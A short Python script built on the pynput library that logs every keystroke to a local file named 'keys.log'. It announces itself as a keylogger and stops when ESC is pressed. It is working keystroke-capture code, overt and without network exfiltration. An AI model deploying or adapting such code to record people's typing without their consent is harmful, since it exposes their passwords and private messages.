from pynput import keyboard
import sys

log_file = "keys.log"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key.name}]")

def on_release(key):
    # Stop when ESC is pressed
    if key == keyboard.Key.esc:
        print("\nStopped safely")
        return False

print("Keylogger running...")
print("Press ESC to stop\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

